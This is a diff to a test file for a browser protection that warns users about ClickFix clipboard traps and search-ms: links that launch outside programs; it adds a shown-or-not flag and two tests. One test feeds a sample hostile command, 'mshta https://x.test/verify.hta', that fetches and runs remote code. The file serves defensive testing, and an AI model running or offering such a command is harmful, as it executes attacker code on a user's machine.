@@ -215,7 +215,7 @@ describe('a link that opens a program outside the browser (B-165)', () => {
     expect(mounts[0]?.props.detail).toContain('[warnOutsideLinkProgram]')
     expect(mounts[0]?.props.detail).toContain('[warnOutsideLinkWhere]')
     expect(mounts[0]?.props.detail).toContain('[warnOutsideLinkStopped]')
-    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'])
+    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'], true)
   })
 
   it('leaves a file address with a host to the browser, which refuses it from a page', () => {
@@ -556,7 +556,7 @@ describe('the trap warnings through the real surface slot (B-165, round 1)', () 
     expect(panels()).toBe(1)
     expect(shown(slot)).toBe('[warnClickfixCopied]')
     expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
-    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'])
+    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'], true)
   })
 
   it('counts a copy the page makes inside a held link click as the page\'s, as a real browser sends it', async () => {
@@ -651,6 +651,27 @@ describe('the trap warnings through the real surface slot (B-165, round 1)', () 
     await settle()
     expect(shown(slot)).toBe('[warnClickfixWants]')
     expect(deps.warned).not.toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
+  })
+
+  it('journals a link clicked under a ClickFix warning without counting its warning as shown (B-210)', async () => {
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    document.dispatchEvent(copyOf('mshta https://x.test/verify.hta'))
+    await settle()
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+
+    link('search-ms:query=x').click()
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'], false)
+  })
+
+  it('counts a link warning as shown when it is the one on screen (B-210)', async () => {
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    link('search-ms:query=x').click()
+    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
+    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'], true)
   })
 
   it('a ClickFix copy replaces a standing outside-link warning on an ordinary-looking page', async () => {
